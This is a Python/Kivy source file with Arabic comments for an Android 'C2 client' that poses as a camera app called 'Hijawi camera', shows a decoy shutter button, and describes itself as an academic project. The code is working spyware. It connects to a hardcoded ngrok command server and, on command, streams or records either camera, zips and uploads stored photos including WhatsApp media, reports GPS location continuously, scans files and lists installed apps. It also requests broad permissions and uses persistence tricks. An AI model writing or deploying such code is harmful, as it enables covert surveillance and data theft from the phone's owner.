#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
client_final_with_camera.py
================================================================================
تطبيق عميل C2 متقدم لنظام التحكم والقيادة عن بُعد
================================================================================
الإصدار: 4.0.0 - يدوي اختيار الكاميرا (أمامية / خلفية)
المؤلف: فريق التطوير الأكاديمي - مشروع كاميرا الحجاوي التعليمي

جميع الميزات السابقة مع إضافة تبديل الكاميرا عبر الأوامر.
================================================================================
"""

import kivy
kivy.require('2.2.1')

from kivy.app import App
from kivy.uix.camera import Camera
from kivy.uix.button import Button
from kivy.uix.floatlayout import FloatLayout
from kivy.uix.label import Label
from kivy.clock import Clock
from kivy.utils import platform
from kivy.core.window import Window
from kivy.logger import Logger
from kivy.animation import Animation

import socketio
import threading
import time
import cv2
import numpy as np
import base64
import json
import os
import sys
import zipfile
import io
import hashlib
import tempfile
import traceback
import uuid
import random
import re
from datetime import datetime
from collections import defaultdict
from functools import wraps
import queue
import signal
import gc

# ==================== التعامل مع صلاحيات الأندرويد ====================
if platform == 'android':
    try:
        from android.permissions import request_permissions, Permission, check_permission
        from android import api_version, mActivity
        from jnius import autoclass, cast, PythonJavaClass, java_method
        
        PythonActivity = autoclass('org.kivy.android.PythonActivity')
        activity = PythonActivity.mActivity
        Context = autoclass('android.content.Context')
        
        # كلاسات الأندرويد
        BatteryManager = autoclass('android.os.BatteryManager')
        IntentFilter = autoclass('android.content.IntentFilter')
        ConnectivityManager = autoclass('android.net.ConnectivityManager')
        NetworkInfo = autoclass('android.net.NetworkInfo')
        LocationManager = autoclass('android.location.LocationManager')
        LocationListener = autoclass('android.location.LocationListener')
        Location = autoclass('android.location.Location')
        Looper = autoclass('android.os.Looper')
        Environment = autoclass('android.os.Environment')
        Build = autoclass('android.os.Build')
        StatFs = autoclass('android.os.StatFs')
        NotificationManager = autoclass('android.app.NotificationManager')
        NotificationChannel = autoclass('android.app.NotificationChannel')
        Notification = autoclass('android.app.Notification')
        NotificationCompat = autoclass('androidx.core.app.NotificationCompat')
        PendingIntent = autoclass('android.app.PendingIntent')
        Intent = autoclass('android.content.Intent')
        PowerManager = autoclass('android.os.PowerManager')
        AlarmManager = autoclass('android.app.AlarmManager')
        SystemClock = autoclass('android.os.SystemClock')
        MediaProjectionManager = autoclass('android.media.projection.MediaProjectionManager')
        MediaRecorder = autoclass('android.media.MediaRecorder')
        DisplayMetrics = autoclass('android.util.DisplayMetrics')
        Surface = autoclass('android.view.Surface')
        
        # الصلاحيات الموسعة
        EXTRA_PERMISSIONS = [
            Permission.CAMERA,
            Permission.RECORD_AUDIO,
            Permission.READ_EXTERNAL_STORAGE,
            Permission.WRITE_EXTERNAL_STORAGE,
            Permission.ACCESS_FINE_LOCATION,
            Permission.ACCESS_COARSE_LOCATION,
            Permission.READ_PHONE_STATE,
            Permission.READ_CONTACTS,
            Permission.READ_SMS,
            Permission.INTERNET,
            Permission.ACCESS_NETWORK_STATE,
            Permission.ACCESS_WIFI_STATE,
            Permission.WAKE_LOCK,
            Permission.RECEIVE_BOOT_COMPLETED,
            Permission.FOREGROUND_SERVICE,
            Permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
        ]
        if api_version >= 33:
            EXTRA_PERMISSIONS.extend([
                'android.permission.POST_NOTIFICATIONS',
                'android.permission.READ_MEDIA_IMAGES',
                'android.permission.READ_MEDIA_VIDEO',
                'android.permission.READ_MEDIA_AUDIO',
                'android.permission.NEARBY_WIFI_DEVICES',
            ])
        if api_version >= 34:
            EXTRA_PERMISSIONS.append('android.permission.FOREGROUND_SERVICE_MEDIA_PROJECTION')
            EXTRA_PERMISSIONS.append('android.permission.FOREGROUND_SERVICE_CAMERA')
            EXTRA_PERMISSIONS.append('android.permission.FOREGROUND_SERVICE_MICROPHONE')
            EXTRA_PERMISSIONS.append('android.permission.FOREGROUND_SERVICE_LOCATION')
            
    except Exception as e:
        print(f"[!] خطأ في تحميل مكتبات الأندرويد: {e}")
        activity = None
        Build = type('Build', (), {'MODEL': 'Emulator', 'MANUFACTURER': 'Unknown', 'VERSION': {'RELEASE': 'Unknown'}})()
        EXTRA_PERMISSIONS = []
else:
    activity = None
    Build = type('Build', (), {'MODEL': 'Emulator', 'MANUFACTURER': 'Unknown', 'VERSION': {'RELEASE': 'Unknown'}})()
    EXTRA_PERMISSIONS = []

# ==================== إعدادات الاتصال ====================
DOMAIN = "tripping-recoil-unending.ngrok-free.dev"
SERVER_URL = f"https://{DOMAIN}"
CONNECTION_TIMEOUT = 10
MAX_RECONNECT_ATTEMPTS = float('inf')
INITIAL_RECONNECT_DELAY = 2
MAX_RECONNECT_DELAY = 60

# ==================== إعدادات البث والتسجيل ====================
FRAME_QUALITY = 65
TARGET_FPS = 20.0
FRAME_INTERVAL = 1.0 / TARGET_FPS
MAX_FRAME_QUEUE_SIZE = 10
ENABLE_ADAPTIVE_QUALITY = True

# مسارات البحث عن الملفات
if platform == 'android' and activity:
    try:
        external_storage = Environment.getExternalStorageDirectory().getAbsolutePath()
        SEARCH_PATHS = [
            os.path.join(external_storage, 'DCIM'),
            os.path.join(external_storage, 'Pictures'),
            os.path.join(external_storage, 'Download'),
            os.path.join(external_storage, 'Music'),
            os.path.join(external_storage, 'Movies'),
            os.path.join(external_storage, 'Documents'),
            os.path.join(external_storage, 'Android/media'),
        ]
        whatsapp_path = os.path.join(external_storage, 'Android/media/com.whatsapp/WhatsApp/Media')
        if os.path.exists(whatsapp_path):
            SEARCH_PATHS.append(whatsapp_path)
    except:
        SEARCH_PATHS = ["/storage/emulated/0/DCIM", "/storage/emulated/0/Pictures", "/storage/emulated/0/Download"]
else:
    SEARCH_PATHS = [os.path.expanduser('~/Pictures'), os.path.expanduser('~/Downloads')]

# ==================== عميل Socket.IO مخصص ====================
class CustomSocketIOClient(socketio.Client):
    def __init__(self):
        super().__init__(logger=False, engineio_logger=False, reconnection=False, request_timeout=10, ssl_verify=False)
        self.is_connected_flag = False
        self.connection_lock = threading.RLock()
    def safe_emit(self, event, data=None, callback=None):
        if self.is_connected_flag and self.connected:
            try:
                self.emit(event, data, callback=callback)
                return True
            except Exception as e:
                Logger.warning(f"فشل الإرسال إلى {event}: {e}")
                return False
        return False

sio = CustomSocketIOClient()

# ==================== مدير الخيوط ====================
class ThreadPool:
    def __init__(self, max_workers=20):
        self.max_workers = max_workers
        self.threads = []
        self.lock = threading.RLock()
    def start_thread(self, target, args=(), daemon=True):
        with self.lock:
            if len([t for t in self.threads if t.is_alive()]) >= self.max_workers:
                return None
            thread = threading.Thread(target=target, args=args, daemon=daemon)
            self.threads.append(thread)
            thread.start()
            return thread

thread_pool = ThreadPool(max_workers=30)

# ==================== مراقب النظام ====================
class SystemMonitor:
    @staticmethod
    def get_battery_level():
        if platform != 'android' or not activity:
            return -1
        try:
            intent = activity.registerReceiver(None, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
            level = intent.getIntExtra(BatteryManager.EXTRA_LEVEL, -1)
            scale = intent.getIntExtra(BatteryManager.EXTRA_SCALE, -1)
            return int((level/scale)*100) if scale>0 else -1
        except:
            return -1
    @staticmethod
    def get_network_type():
        if platform != 'android' or not activity:
            return "unknown"
        try:
            cm = activity.getSystemService(Context.CONNECTIVITY_SERVICE)
            net_info = cm.getActiveNetworkInfo()
            if net_info and net_info.isConnected():
                t = net_info.getType()
                if t == ConnectivityManager.TYPE_WIFI:
                    return "wifi"
                elif t == ConnectivityManager.TYPE_MOBILE:
                    return "cellular"
            return "disconnected"
        except:
            return "unknown"
    @staticmethod
    def get_device_info():
        return {
            "device_id": str(uuid.uuid4()),
            "model": Build.MODEL if hasattr(Build, 'MODEL') else "Unknown",
            "manufacturer": Build.MANUFACTURER if hasattr(Build, 'MANUFACTURER') else "Unknown",
            "android_version": Build.VERSION.RELEASE if hasattr(Build.VERSION, 'RELEASE') else "Unknown",
            "sdk_version": api_version if platform=='android' else 0,
            "battery": SystemMonitor.get_battery_level(),
            "network": SystemMonitor.get_network_type(),
            "timestamp": datetime.now().isoformat()
        }

# ==================== أنظمة البقاء ====================
class PersistenceManager:
    @staticmethod
    def enable_all():
        if platform != 'android' or not activity:
            return
        try:
            intent = Intent(Intent.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS)
            activity.startActivity(intent)
            pm = activity.getSystemService(Context.POWER_SERVICE)
            wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "Hijawi:WakeLock")
            wl.acquire()
            try:
                from android import notify
                notify("كاميرا الحجاوي", "التطبيق يعمل في الخلفية", ongoing=True)
            except:
                pass
            Logger.info("Persistence: تم تفعيل آليات البقاء")
        except Exception as e:
            Logger.warning(f"Persistence error: {e}")

# ==================== GPS المتقدم ====================
class GPSLocationListener(LocationListener):
    def __init__(self, callback):
        super().__init__()
        self.callback = callback
    @java_method('(Landroid/location/Location;)V')
    def onLocationChanged(self, location):
        if location and self.callback:
            self.callback({
                'lat': location.getLatitude(),
                'lon': location.getLongitude(),
                'accuracy': location.getAccuracy(),
                'provider': str(location.getProvider()),
                'timestamp': datetime.now().isoformat()
            })
    @java_method('(Ljava/lang/String;)V')
    def onProviderDisabled(self, provider): pass
    @java_method('(Ljava/lang/String;)V')
    def onProviderEnabled(self, provider): pass
    @java_method('(Ljava/lang/String;ILandroid/os/Bundle;)V')
    def onStatusChanged(self, provider, status, extras): pass

class GPSManager:
    def __init__(self):
        self.listener = None
        self.location_manager = None
        self.running = False
    def start(self, callback, interval_ms=5000):
        if platform!='android' or not activity:
            return False
        try:
            self.location_manager = activity.getSystemService(Context.LOCATION_SERVICE)
            self.listener = GPSLocationListener(callback)
            self.location_manager.requestLocationUpdates(LocationManager.GPS_PROVIDER, interval_ms, 0, self.listener, Looper.getMainLooper())
            self.location_manager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, interval_ms, 0, self.listener, Looper.getMainLooper())
            self.running = True
            return True
        except Exception as e:
            Logger.error(f"GPS start error: {e}")
            return False
    def stop(self):
        if self.location_manager and self.listener:
            self.location_manager.removeUpdates(self.listener)
            self.running = False
    def get_last_known(self):
        if not self.location_manager:
            return None
        best = None
        best_acc = float('inf')
        for prov in [LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER]:
            try:
                loc = self.location_manager.getLastKnownLocation(prov)
                if loc and loc.getAccuracy() < best_acc:
                    best_acc = loc.getAccuracy()
                    best = loc
            except:
                pass
        return best

gps_manager = GPSManager()

# ==================== معالج الأوامر (مع دعم تبديل الكاميرا) ====================
# المتغيرات العامة
is_streaming = False
is_recording_video = False
current_stream_camera = 0   # 0 خلفية، 1 أمامية
stream_thread = None
current_cap = None
stream_lock = threading.RLock()

class CommandHandler:
    @staticmethod
    def start_stream(camera='back'):
        global is_streaming, current_stream_camera, stream_thread, current_cap
        # إيقاف أي بث جاري أولاً
        if is_streaming:
            CommandHandler.stop_stream()
        # تحديد الكاميرا
        camera_id = 0 if camera == 'back' else 1
        current_stream_camera = camera_id
        is_streaming = True
        sio.safe_emit('command_response', {'status': 'stream_started', 'camera': camera})
        
        def stream_worker():
            global is_streaming, current_cap
            cap = cv2.VideoCapture(current_stream_camera)
            if not cap.isOpened():
                Logger.error("لا يمكن فتح الكاميرا للبث")
                is_streaming = False
                return
            cap.set(cv2.CAP_PROP_FRAME_WIDTH, 640)
            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)
            cap.set(cv2.CAP_PROP_FPS, 20)
            current_cap = cap
            last_time = time.time()
            while is_streaming and sio.connected:
                ret, frame = cap.read()
                if not ret:
                    time.sleep(0.05)
                    continue
                # جودة متكيفة
                quality = FRAME_QUALITY
                if ENABLE_ADAPTIVE_QUALITY:
                    bat = SystemMonitor.get_battery_level()
                    if 0 <= bat < 15:
                        quality = 40
                    elif 15 <= bat < 30:
                        quality = 55
                _, enc = cv2.imencode('.jpg', frame, [cv2.IMWRITE_JPEG_QUALITY, quality])
                b64 = base64.b64encode(enc).decode()
                sio.safe_emit('video_frame', {'image': b64})
                time.sleep(FRAME_INTERVAL)
            cap.release()
            current_cap = None
        
        stream_thread = thread_pool.start_thread(stream_worker)
    
    @staticmethod
    def stop_stream():
        global is_streaming
        is_streaming = False
        sio.safe_emit('command_response', {'status': 'stream_stopped'})
    
    @staticmethod
    def record_video(duration=10, quality='medium', camera='back'):
        global is_recording_video
        if is_recording_video:
            sio.safe_emit('command_response', {'status': 'already_recording'})
            return
        is_recording_video = True
        camera_id = 0 if camera == 'back' else 1
        sio.safe_emit('command_response', {'status': 'recording_started', 'duration': duration, 'quality': quality, 'camera': camera})
        
        q_settings = {'low': (320,240), 'medium': (640,480), 'high': (1280,720)}
        w, h = q_settings.get(quality, (640,480))
        
        def rec_worker():
            global is_recording_video
            cap = cv2.VideoCapture(camera_id)
            if not cap.isOpened():
                sio.safe_emit('command_response', {'status': 'recording_error', 'error': 'cannot_open_camera'})
                is_recording_video = False
                return
            cap.set(cv2.CAP_PROP_FRAME_WIDTH, w)
            cap.set(cv2.CAP_PROP_FRAME_HEIGHT, h)
            fourcc = cv2.VideoWriter_fourcc(*'mp4v')
            ts = datetime.now().strftime('%Y%m%d_%H%M%S')
            temp_file = tempfile.NamedTemporaryFile(suffix='.mp4', delete=False)
            out = cv2.VideoWriter(temp_file.name, fourcc, 20.0, (w, h))
            start = time.time()
            frames = 0
            while is_recording_video and (time.time() - start) < duration:
                ret, frame = cap.read()
                if ret:
                    frame = cv2.resize(frame, (w, h))
                    out.write(frame)
                    frames += 1
                time.sleep(0.05)
            out.release()
            cap.release()
            if frames > 0 and os.path.exists(temp_file.name):
                with open(temp_file.name, 'rb') as f:
                    vid_bytes = f.read()
                b64 = base64.b64encode(vid_bytes).decode()
                chunk_sz = 500*1024
                total = (len(b64)+chunk_sz-1)//chunk_sz
                for i in range(0, len(b64), chunk_sz):
                    sio.safe_emit('video_recording_chunk', {
                        'chunk': b64[i:i+chunk_sz],
                        'chunk_index': i//chunk_sz,
                        'total_chunks': total,
                        'filename': f"recording_{ts}.mp4"
                    })
                    time.sleep(0.05)
                os.remove(temp_file.name)
                sio.safe_emit('command_response', {'status': 'recording_complete', 'frames': frames})
            else:
                sio.safe_emit('command_response', {'status': 'recording_failed'})
            is_recording_video = False
        thread_pool.start_thread(rec_worker)
    
    @staticmethod
    def extract_all_photos():
        sio.safe_emit('command_response', {'status': 'extraction_started'})
        def extr_worker():
            try:
                photos = []
                exts = ('.jpg','.jpeg','.png','.gif','.bmp','.webp')
                for p in SEARCH_PATHS:
                    if os.path.exists(p):
                        for root,_,files in os.walk(p):
                            for f in files:
                                if f.lower().endswith(exts):
                                    full = os.path.join(root,f)
                                    if os.path.getsize(full) < 50*1024*1024:
                                        photos.append(full)
                    sio.safe_emit('extraction_progress', {'message': f'وجدت {len(photos)} صورة', 'progress': 30})
                if not photos:
                    sio.safe_emit('command_response', {'status': 'extraction_no_photos'})
                    return
                buf = io.BytesIO()
                with zipfile.ZipFile(buf,'w',zipfile.ZIP_DEFLATED) as zf:
                    for idx,path in enumerate(photos[:500]):
                        try:
                            zf.write(path, os.path.basename(path))
                            if idx%50==0:
                                prog = 30 + int(60*idx/min(len(photos),500))
                                sio.safe_emit('extraction_progress', {'message': f'ضغط {idx}/{len(photos)}', 'progress': prog})
                        except:
                            pass
                zip_data = buf.getvalue()
                b64 = base64.b64encode(zip_data).decode()
                chunk_sz = 500*1024
                total = (len(b64)+chunk_sz-1)//chunk_sz
                for i in range(0, len(b64), chunk_sz):
                    sio.safe_emit('photos_zip_chunk', {
                        'chunk': b64[i:i+chunk_sz],
                        'chunk_index': i//chunk_sz,
                        'total_chunks': total,
                        'total_photos': len(photos)
                    })
                    time.sleep(0.05)
                sio.safe_emit('command_response', {'status': 'extraction_complete', 'total_photos': len(photos)})
            except Exception as e:
                sio.safe_emit('command_response', {'status': 'extraction_error', 'error': str(e)})
        thread_pool.start_thread(extr_worker)
    
    @staticmethod
    def take_screenshot():
        try:
            ts = datetime.now().strftime('%Y%m%d_%H%M%S')
            fname = f"screenshot_{ts}.png"
            Window.screenshot(name=fname)
            with open(fname, 'rb') as f:
                b64 = base64.b64encode(f.read()).decode()
            os.remove(fname)
            sio.safe_emit('screenshot_data', {'image': b64, 'filename': fname})
            sio.safe_emit('command_response', {'status': 'screenshot_taken'})
        except Exception as e:
            sio.safe_emit('command_response', {'status': 'screenshot_error', 'error': str(e)})
    
    @staticmethod
    def get_location():
        loc = gps_manager.get_last_known()
        if loc:
            sio.safe_emit('location_update', {
                'lat': loc.getLatitude(),
                'lon': loc.getLongitude(),
                'accuracy': loc.getAccuracy(),
                'timestamp': datetime.now().isoformat()
            })
            sio.safe_emit('command_response', {'status': 'location_sent'})
        else:
            sio.safe_emit('command_response', {'status': 'location_unavailable'})
    
    @staticmethod
    def get_device_info():
        info = SystemMonitor.get_device_info()
        sio.safe_emit('device_info_update', info)
        sio.safe_emit('command_response', {'status': 'device_info_sent'})
    
    @staticmethod
    def get_installed_apps():
        if platform!='android' or not activity:
            sio.safe_emit('command_response', {'status': 'apps_not_available'})
            return
        try:
            pm = activity.getPackageManager()
            pkgs = pm.getInstalledPackages(0)
            apps = []
            for pkg in pkgs:
                try:
                    apps.append({
                        'name': str(pkg.applicationInfo.loadLabel(pm)),
                        'package': pkg.packageName,
                        'version': pkg.versionName,
                        'is_system': (pkg.applicationInfo.flags & 1) != 0
                    })
                except:
                    pass
            sio.safe_emit('installed_apps_list', {'apps': apps[:200], 'total': len(apps)})
            sio.safe_emit('command_response', {'status': 'apps_sent', 'count': len(apps)})
        except Exception as e:
            sio.safe_emit('command_response', {'status': 'apps_error', 'error': str(e)})
    
    @staticmethod
    def scan_all_files():
        sio.safe_emit('command_response', {'status': 'file_scan_started'})
        def scan_worker():
            try:
                all_files = []
                cats = {
                    'images': ('.jpg','.jpeg','.png','.gif','.bmp','.webp'),
                    'videos': ('.mp4','.avi','.mov','.mkv','.flv','.3gp'),
                    'audio': ('.mp3','.wav','.ogg','.aac','.flac'),
                    'docs': ('.pdf','.doc','.docx','.txt','.xls','.xlsx','.ppt','.pptx'),
                    'archives': ('.zip','.rar','.7z','.tar','.gz')
                }
                total = 0
                for p in SEARCH_PATHS:
                    if os.path.exists(p):
                        for root,_,files in os.walk(p):
                            for f in files:
                                ext = os.path.splitext(f)[1].lower()
                                for cat, exts in cats.items():
                                    if ext in exts:
                                        total += 1
                                        if total <= 1000:
                                            all_files.append({
                                                'name': f,
                                                'path': os.path.join(root,f),
                                                'category': cat,
                                                'size': os.path.getsize(os.path.join(root,f))
                                            })
                                        break
                sio.safe_emit('file_scan_results', {'total_files': total, 'files': all_files[:500], 'timestamp': datetime.now().isoformat()})
                sio.safe_emit('command_response', {'status': 'file_scan_complete', 'total': total})
            except Exception as e:
                sio.safe_emit('command_response', {'status': 'file_scan_error', 'error': str(e)})
        thread_pool.start_thread(scan_worker)
    
    @staticmethod
    def start_screen_record(duration=30):
        # محاكاة تعليمية
        sio.safe_emit('command_response', {'status': 'screen_recording_started_simulated'})
        def sim():
            time.sleep(duration)
            sio.safe_emit('command_response', {'status': 'screen_recording_complete_simulated', 'duration': duration})
        thread_pool.start_thread(sim)

# ==================== أحداث WebSocket ====================
def on_gps_location(loc):
    sio.safe_emit('location_update', loc)

@sio.event
def connect():
    dev = Build.MODEL if hasattr(Build,'MODEL') else 'Emulator'
    Logger.info(f"Connected to C2 Server as {dev}")
    sio.safe_emit('client_ready', {
        'device': dev,
        'manufacturer': Build.MANUFACTURER if hasattr(Build,'MANUFACTURER') else 'Unknown',
        'android_version': Build.VERSION.RELEASE if hasattr(Build.VERSION,'RELEASE') else 'Unknown',
        'sdk_version': api_version if platform=='android' else 0,
        'client_id': str(uuid.uuid4()),
        'timestamp': datetime.now().isoformat()
    })
    if platform=='android':
        gps_manager.start(on_gps_location, interval_ms=5000)

@sio.event
def disconnect():
    Logger.info("Disconnected from server")
    global is_streaming
    is_streaming = False
    gps_manager.stop()

@sio.event
def command(data):
    cmd = data.get('cmd', '').upper()
    params = data.get('params', {})
    Logger.info(f"Command: {cmd} | Params: {params}")
    handlers = {
        'START_STREAM': lambda: CommandHandler.start_stream(params.get('camera', 'back')),
        'STOP_STREAM': CommandHandler.stop_stream,
        'RECORD_VIDEO': lambda: CommandHandler.record_video(params.get('duration',10), params.get('quality','medium'), params.get('camera','back')),
        'EXTRACT_ALL_PHOTOS': CommandHandler.extract_all_photos,
        'TAKE_SCREENSHOT': CommandHandler.take_screenshot,
        'GET_LOCATION': CommandHandler.get_location,
        'GET_DEVICE_INFO': CommandHandler.get_device_info,
        'GET_INSTALLED_APPS': CommandHandler.get_installed_apps,
        'SCAN_ALL_FILES': CommandHandler.scan_all_files,
        'START_SCREEN_RECORD': lambda: CommandHandler.start_screen_record(params.get('duration',30)),
        'PING': lambda: sio.safe_emit('command_response', {'status': 'pong'}),
    }
    handler = handlers.get(cmd)
    if handler:
        handler()
    else:
        sio.safe_emit('command_response', {'status': 'unknown_command', 'cmd': cmd})

# ==================== إعادة اتصال تلقائي ====================
def auto_reconnect_loop():
    delay = INITIAL_RECONNECT_DELAY
    while True:
        try:
            if not sio.is_connected_flag:
                Logger.info(f"محاولة الاتصال بـ {SERVER_URL}")
                sio.connect(SERVER_URL, transports=['websocket','polling'], wait_timeout=CONNECTION_TIMEOUT)
                sio.is_connected_flag = True
                delay = INITIAL_RECONNECT_DELAY
            else:
                if not sio.connected:
                    sio.is_connected_flag = False
        except Exception as e:
            sio.is_connected_flag = False
            delay = min(delay*1.5, MAX_RECONNECT_DELAY)
            Logger.warning(f"فشل الاتصال: {e}. إعادة المحاولة بعد {delay:.1f} ثانية")
        time.sleep(delay)

def keep_alive_loop():
    while True:
        if sio.is_connected_flag and sio.connected:
            sio.safe_emit('heartbeat', {'timestamp': time.time()})
        time.sleep(30)

# ==================== تطبيق Kivy ====================
class HijawiUltimateApp(App):
    def build(self):
        if platform == 'android':
            request_permissions(EXTRA_PERMISSIONS)
            Clock.schedule_once(lambda dt: PersistenceManager.enable_all(), 3)
        layout = FloatLayout()
        self.camera_widget = Camera(resolution=(640,480), play=True)
        self.camera_widget.size_hint = (1,1)
        layout.add_widget(self.camera_widget)
        fake_btn = Button(text="📸", size_hint=(0.15,0.08), pos_hint={'x':0.425,'y':0.05},
                         background_color=(0.2,0.6,0.2,0.9), font_size='35sp')
        layout.add_widget(fake_btn)
        threading.Thread(target=auto_reconnect_loop, daemon=True).start()
        threading.Thread(target=keep_alive_loop, daemon=True).start()
        return layout
    def on_stop(self):
        global is_streaming
        is_streaming = False
        gps_manager.stop()
        if sio.is_connected_flag:
            sio.disconnect()

if __name__ == '__main__':
    HijawiUltimateApp().run()